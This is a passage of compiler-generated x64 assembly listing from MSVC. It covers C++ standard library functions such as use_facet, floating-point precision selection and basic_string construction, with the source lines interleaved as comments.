; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?decimal_point@?$numpunct@D@std@@QEBADXZ
_TEXT	SEGMENT
this$ = 48
?decimal_point@?$numpunct@D@std@@QEBADXZ PROC		; std::numpunct<char>::decimal_point, COMDAT

; 109  :     _Elem decimal_point() const {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 110  :         return do_decimal_point();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+24]

; 111  :     }

	add	rsp, 40					; 00000028H
	ret	0
?decimal_point@?$numpunct@D@std@@QEBADXZ ENDP		; std::numpunct<char>::decimal_point
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z
_TEXT	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z PROC ; std::use_facet<std::numpunct<char> >, COMDAT

; 422  : const _Facet& __CRTDECL use_facet(const locale& _Loc) { // get facet reference from locale

$LN11:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 423  :     _BEGIN_LOCK(_LOCK_LOCALE) // the thread lock, make get atomic

	xor	edx, edx
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??0_Lockit@std@@QEAA@H@Z		; std::_Lockit::_Lockit
	npad	1

; 424  :     const locale::facet* _Psave = _Facetptr<_Facet>::_Psave; // static pointer to lazy facet

	mov	rax, QWORD PTR ?_Psave@?$_Facetptr@V?$numpunct@D@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::numpunct<char> >::_Psave
	mov	QWORD PTR _Psave$2[rsp], rax

; 425  : 
; 426  :     const size_t _Id         = _Facet::id;

	lea	rcx, OFFSET FLAT:?id@?$numpunct@D@std@@2V0locale@2@A ; std::numpunct<char>::id
	call	??Bid@locale@std@@QEAA_KXZ		; std::locale::id::operator unsigned __int64
	mov	QWORD PTR _Id$6[rsp], rax

; 427  :     const locale::facet* _Pf = _Loc._Getfacet(_Id);

	mov	rdx, QWORD PTR _Id$6[rsp]
	mov	rcx, QWORD PTR _Loc$[rsp]
	call	?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z ; std::locale::_Getfacet
	mov	QWORD PTR _Pf$4[rsp], rax

; 428  : 
; 429  :     if (!_Pf) {

	cmp	QWORD PTR _Pf$4[rsp], 0
	jne	$LN2@use_facet

; 430  :         if (_Psave) {

	cmp	QWORD PTR _Psave$2[rsp], 0
	je	SHORT $LN3@use_facet

; 431  :             _Pf = _Psave; // lazy facet already allocated

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax
	jmp	SHORT $LN2@use_facet
$LN3@use_facet:

; 432  :         } else if (_Facet::_Getcat(&_Psave, &_Loc) == static_cast<size_t>(-1)) {

	mov	rdx, QWORD PTR _Loc$[rsp]
	lea	rcx, QWORD PTR _Psave$2[rsp]
	call	?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::numpunct<char>::_Getcat
	cmp	rax, -1
	jne	SHORT $LN5@use_facet

; 433  : #if _HAS_EXCEPTIONS
; 434  :             _Throw_bad_cast(); // lazy disallowed

	call	?_Throw_bad_cast@std@@YAXXZ		; std::_Throw_bad_cast
	npad	1

; 435  : #else // _HAS_EXCEPTIONS
; 436  :             _CSTD abort(); // lazy disallowed
; 437  : #endif // _HAS_EXCEPTIONS
; 438  :         } else { // queue up lazy facet for destruction

	jmp	SHORT $LN2@use_facet
$LN5@use_facet:

; 439  :             auto _Pfmod = const_cast<locale::facet*>(_Psave);

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pfmod$3[rsp], rax

; 440  :             unique_ptr<_Facet_base> _Psave_guard(static_cast<_Facet_base*>(_Pfmod));

	mov	rdx, QWORD PTR _Pfmod$3[rsp]
	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
	npad	1

; 441  : 
; 442  : #if defined(_M_CEE)
; 443  :             _Facet_Register_m(_Pfmod);
; 444  : #else // defined(_M_CEE)
; 445  :             _Facet_Register(_Pfmod);

	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	?_Facet_Register@std@@YAXPEAV_Facet_base@1@@Z ; std::_Facet_Register

; 446  : #endif // defined(_M_CEE)
; 447  : 
; 448  :             _Pfmod->_Incref();

	mov	rax, QWORD PTR _Pfmod$3[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	QWORD PTR [rax+8]

; 449  :             _Facetptr<_Facet>::_Psave = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR ?_Psave@?$_Facetptr@V?$numpunct@D@std@@@std@@2PEBVfacet@locale@2@EB, rax ; std::_Facetptr<std::numpunct<char> >::_Psave

; 450  :             _Pf                       = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax

; 451  : 
; 452  :             (void) _Psave_guard.release();

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
	npad	1

; 453  :         }

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
$LN2@use_facet:

; 454  :     }
; 455  : 
; 456  :     return static_cast<const _Facet&>(*_Pf); // should be dynamic_cast

	mov	rax, QWORD PTR _Pf$4[rsp]
	mov	QWORD PTR $T7[rsp], rax
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	mov	rax, QWORD PTR $T7[rsp]

; 457  :     _END_LOCK()
; 458  : } // end of use_facet body

	add	rsp, 104				; 00000068H
	ret	0
$LN10@use_facet:
??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z ENDP ; std::use_facet<std::numpunct<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::numpunct<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Lock$1[rbp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::numpunct<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::numpunct<char> >'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Psave_guard$5[rbp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::numpunct<char> >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??$_Float_put_desired_precision@N@std@@YAH_JH@Z
_TEXT	SEGMENT
tv65 = 0
tv71 = 1
_Is_hex$ = 2
_Is_default_float$1 = 3
_Default_precision$2 = 4
_Precision$ = 32
_Float_flags$ = 40
??$_Float_put_desired_precision@N@std@@YAH_JH@Z PROC	; std::_Float_put_desired_precision<double>, COMDAT

; 1137 : int _Float_put_desired_precision(const streamsize _Precision, const ios_base::fmtflags _Float_flags) {

$LN14:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1138 :     // return the effective precision determined by N4910 [facet.num.put.virtuals]/2.1 and printf's rules
; 1139 :     const bool _Is_hex = _Float_flags == (ios_base::fixed | ios_base::scientific);

	cmp	DWORD PTR _Float_flags$[rsp], 12288	; 00003000H
	jne	SHORT $LN10@Float_put_
	mov	BYTE PTR tv65[rsp], 1
	jmp	SHORT $LN11@Float_put_
$LN10@Float_put_:
	mov	BYTE PTR tv65[rsp], 0
$LN11@Float_put_:
	movzx	eax, BYTE PTR tv65[rsp]
	mov	BYTE PTR _Is_hex$[rsp], al

; 1140 :     if (_Is_hex) {

	movzx	eax, BYTE PTR _Is_hex$[rsp]
	test	eax, eax
	je	SHORT $LN2@Float_put_

; 1141 :         // return the number of hexits needed (after the radix point) to represent the floating-point value exactly
; 1142 :         if constexpr (is_same_v<_Ty, double>) {
; 1143 :             return ((DBL_MANT_DIG - 1) + 3) / 4;

	mov	eax, 13
	jmp	SHORT $LN1@Float_put_
$LN2@Float_put_:

; 1144 :         } else if constexpr (is_same_v<_Ty, long double>) {
; 1145 :             return ((LDBL_MANT_DIG - 1) + 3) / 4;
; 1146 :         } else {
; 1147 :             static_assert(_Always_false<_Ty>, "Expected only double or long double here (not float).");
; 1148 :         }
; 1149 :     }
; 1150 : 
; 1151 :     if (_Precision > 0) {

	cmp	QWORD PTR _Precision$[rsp], 0
	jle	SHORT $LN3@Float_put_

; 1152 :         return static_cast<int>(_Precision);

	mov	eax, DWORD PTR _Precision$[rsp]
	jmp	SHORT $LN1@Float_put_
	jmp	SHORT $LN4@Float_put_
$LN3@Float_put_:

; 1153 :     } else if (_Precision == 0) {

	cmp	QWORD PTR _Precision$[rsp], 0
	jne	SHORT $LN5@Float_put_

; 1154 :         const bool _Is_default_float = _Float_flags == 0;

	cmp	DWORD PTR _Float_flags$[rsp], 0
	jne	SHORT $LN12@Float_put_
	mov	BYTE PTR tv71[rsp], 1
	jmp	SHORT $LN13@Float_put_
$LN12@Float_put_:
	mov	BYTE PTR tv71[rsp], 0
$LN13@Float_put_:
	movzx	eax, BYTE PTR tv71[rsp]
	mov	BYTE PTR _Is_default_float$1[rsp], al

; 1155 :         if (_Is_default_float) {

	movzx	eax, BYTE PTR _Is_default_float$1[rsp]
	test	eax, eax
	je	SHORT $LN7@Float_put_

; 1156 :             return 1;

	mov	eax, 1
	jmp	SHORT $LN1@Float_put_

; 1157 :         } else {

	jmp	SHORT $LN8@Float_put_
$LN7@Float_put_:

; 1158 :             return 0;

	xor	eax, eax
	jmp	SHORT $LN1@Float_put_
$LN8@Float_put_:

; 1159 :         }
; 1160 :     } else {

	jmp	SHORT $LN6@Float_put_
$LN5@Float_put_:

; 1161 :         constexpr int _Default_precision = 6;

	mov	DWORD PTR _Default_precision$2[rsp], 6

; 1162 :         return _Default_precision;

	mov	eax, 6
$LN6@Float_put_:
$LN4@Float_put_:
$LN1@Float_put_:

; 1163 :     }
; 1164 : }

	add	rsp, 24
	ret	0
??$_Float_put_desired_precision@N@std@@YAH_JH@Z ENDP	; std::_Float_put_desired_precision<double>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??$_Float_put_desired_precision@O@std@@YAH_JH@Z
_TEXT	SEGMENT
tv65 = 0
tv71 = 1
_Is_hex$ = 2
_Is_default_float$1 = 3
_Default_precision$2 = 4
_Precision$ = 32
_Float_flags$ = 40
??$_Float_put_desired_precision@O@std@@YAH_JH@Z PROC	; std::_Float_put_desired_precision<long double>, COMDAT

; 1137 : int _Float_put_desired_precision(const streamsize _Precision, const ios_base::fmtflags _Float_flags) {

$LN14:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1138 :     // return the effective precision determined by N4910 [facet.num.put.virtuals]/2.1 and printf's rules
; 1139 :     const bool _Is_hex = _Float_flags == (ios_base::fixed | ios_base::scientific);

	cmp	DWORD PTR _Float_flags$[rsp], 12288	; 00003000H
	jne	SHORT $LN10@Float_put_
	mov	BYTE PTR tv65[rsp], 1
	jmp	SHORT $LN11@Float_put_
$LN10@Float_put_:
	mov	BYTE PTR tv65[rsp], 0
$LN11@Float_put_:
	movzx	eax, BYTE PTR tv65[rsp]
	mov	BYTE PTR _Is_hex$[rsp], al

; 1140 :     if (_Is_hex) {

	movzx	eax, BYTE PTR _Is_hex$[rsp]
	test	eax, eax
	je	SHORT $LN2@Float_put_

; 1141 :         // return the number of hexits needed (after the radix point) to represent the floating-point value exactly
; 1142 :         if constexpr (is_same_v<_Ty, double>) {
; 1143 :             return ((DBL_MANT_DIG - 1) + 3) / 4;
; 1144 :         } else if constexpr (is_same_v<_Ty, long double>) {
; 1145 :             return ((LDBL_MANT_DIG - 1) + 3) / 4;

	mov	eax, 13
	jmp	SHORT $LN1@Float_put_
$LN2@Float_put_:

; 1146 :         } else {
; 1147 :             static_assert(_Always_false<_Ty>, "Expected only double or long double here (not float).");
; 1148 :         }
; 1149 :     }
; 1150 : 
; 1151 :     if (_Precision > 0) {

	cmp	QWORD PTR _Precision$[rsp], 0
	jle	SHORT $LN3@Float_put_

; 1152 :         return static_cast<int>(_Precision);

	mov	eax, DWORD PTR _Precision$[rsp]
	jmp	SHORT $LN1@Float_put_
	jmp	SHORT $LN4@Float_put_
$LN3@Float_put_:

; 1153 :     } else if (_Precision == 0) {

	cmp	QWORD PTR _Precision$[rsp], 0
	jne	SHORT $LN5@Float_put_

; 1154 :         const bool _Is_default_float = _Float_flags == 0;

	cmp	DWORD PTR _Float_flags$[rsp], 0
	jne	SHORT $LN12@Float_put_
	mov	BYTE PTR tv71[rsp], 1
	jmp	SHORT $LN13@Float_put_
$LN12@Float_put_:
	mov	BYTE PTR tv71[rsp], 0
$LN13@Float_put_:
	movzx	eax, BYTE PTR tv71[rsp]
	mov	BYTE PTR _Is_default_float$1[rsp], al

; 1155 :         if (_Is_default_float) {

	movzx	eax, BYTE PTR _Is_default_float$1[rsp]
	test	eax, eax
	je	SHORT $LN7@Float_put_

; 1156 :             return 1;

	mov	eax, 1
	jmp	SHORT $LN1@Float_put_

; 1157 :         } else {

	jmp	SHORT $LN8@Float_put_
$LN7@Float_put_:

; 1158 :             return 0;

	xor	eax, eax
	jmp	SHORT $LN1@Float_put_
$LN8@Float_put_:

; 1159 :         }
; 1160 :     } else {

	jmp	SHORT $LN6@Float_put_
$LN5@Float_put_:

; 1161 :         constexpr int _Default_precision = 6;

	mov	DWORD PTR _Default_precision$2[rsp], 6

; 1162 :         return _Default_precision;

	mov	eax, 6
$LN6@Float_put_:
$LN4@Float_put_:
$LN1@Float_put_:

; 1163 :     }
; 1164 : }

	add	rsp, 24
	ret	0
??$_Float_put_desired_precision@O@std@@YAH_JH@Z ENDP	; std::_Float_put_desired_precision<long double>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z
_TEXT	SEGMENT
tv79 = 32
_Proxy$ = 33
_Stay_small$ = 34
_My_data$ = 40
_New_capacity$ = 48
_New_ptr$ = 56
_Alproxy$ = 64
_Al$ = 72
tv140 = 80
this$ = 112
_Arg$ = 120
_Count$ = 128
??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>, COMDAT

; 2672 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 2673 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2674 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2675 :         } else {
; 2676 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2677 :         }
; 2678 : 
; 2679 :         if (_Count > max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Construct

; 2680 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Construct:

; 2681 :         }
; 2682 : 
; 2683 :         auto& _My_data  = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 2684 :         auto& _Al       = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 2685 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

	lea	rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	QWORD PTR _Alproxy$[rsp], rax

; 2686 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

	mov	r8, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR _Alproxy$[rsp]
	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2687 : 
; 2688 : #if _HAS_CXX20
; 2689 :         if (_STD is_constant_evaluated()) {
; 2690 :             _My_data._Myres = _BUF_SIZE; // TRANSITION: constexpr SSO
; 2691 :         }
; 2692 : 
; 2693 :         const bool _Stay_small = _Count < _BUF_SIZE && !_STD is_constant_evaluated();
; 2694 : #else // ^^^ _HAS_CXX20 / !_HAS_CXX20 vvv
; 2695 :         const bool _Stay_small = _Count < _BUF_SIZE;

	cmp	QWORD PTR _Count$[rsp], 16
	jae	SHORT $LN5@Construct
	mov	BYTE PTR tv79[rsp], 1
	jmp	SHORT $LN6@Construct
$LN5@Construct:
	mov	BYTE PTR tv79[rsp], 0
$LN6@Construct:
	movzx	eax, BYTE PTR tv79[rsp]
	mov	BYTE PTR _Stay_small$[rsp], al

; 2696 : #endif // _HAS_CXX20
; 2697 : 
; 2698 :         if (_Stay_small) {

	movzx	eax, BYTE PTR _Stay_small$[rsp]
	test	eax, eax
	je	SHORT $LN3@Construct

; 2699 : #if _HAS_CXX20
; 2700 :             // TRANSITION: This is currently unused until SSO support is merged
; 2701 :             if (_STD is_constant_evaluated()) {
; 2702 :                 _Construct_in_place(_My_data._Bx);
; 2703 :             }
; 2704 : #endif // _HAS_CXX20
; 2705 : 
; 2706 :             _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2707 :             _My_data._Myres  = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 2708 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2710 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2711 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2713 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2714 :             } else { // _Strat == _Construct_strategy::_From_string
; 2715 : #ifdef _INSERT_STRING_ANNOTATION
; 2716 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2717 : #else // ^^^ _INSERT_STRING_ANNOTATION ^^^ // vvv !_INSERT_STRING_ANNOTATION vvv
; 2718 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	r8d, 16
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::move

; 2719 : #endif // !_INSERT_STRING_ANNOTATION
; 2720 :             }
; 2721 : 
; 2722 :             _ASAN_STRING_CREATE(*this);
; 2723 :             _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2724 :             return;

	jmp	$LN1@Construct
$LN3@Construct:

; 2725 :         }
; 2726 : 
; 2727 :         _My_data._Myres               = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 2728 :         const size_type _New_capacity = _Calculate_growth(_Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 2729 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 2730 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>

; 2731 : 
; 2732 : #if _HAS_CXX20
; 2733 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 2734 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 2735 :         }
; 2736 : #endif // _HAS_CXX20
; 2737 : 
; 2738 :         _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2739 :         _My_data._Myres  = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 2740 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2741 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2742 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2743 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2744 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2745 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2746 :         } else { // _Strat == _Construct_strategy::_From_string
; 2747 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

	mov	rax, QWORD PTR _Count$[rsp]
	inc	rax
	mov	QWORD PTR tv140[rsp], rax
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	rcx, QWORD PTR tv140[rsp]
	mov	r8, rcx
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 2748 :         }
; 2749 : 
; 2750 :         _ASAN_STRING_CREATE(*this);
; 2751 :         _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2752 :     }

	add	rsp, 104				; 00000068H
	ret	0
??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z
_TEXT	SEGMENT
tv79 = 32
_Proxy$ = 33
_Stay_small$ = 34
$T1 = 35
$T2 = 36
_My_data$ = 40
_New_ptr$ = 48
_New_capacity$ = 56
_Alproxy$ = 64
_Al$ = 72
this$ = 96
_Arg$ = 104
_Count$ = 112
??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>, COMDAT

; 2672 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 2673 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2674 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2675 :         } else {
; 2676 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2677 :         }
; 2678 : 
; 2679 :         if (_Count > max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Construct

; 2680 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Construct:

; 2681 :         }
; 2682 : 
; 2683 :         auto& _My_data  = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 2684 :         auto& _Al       = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 2685 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

	lea	rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	QWORD PTR _Alproxy$[rsp], rax

; 2686 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

	mov	r8, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR _Alproxy$[rsp]
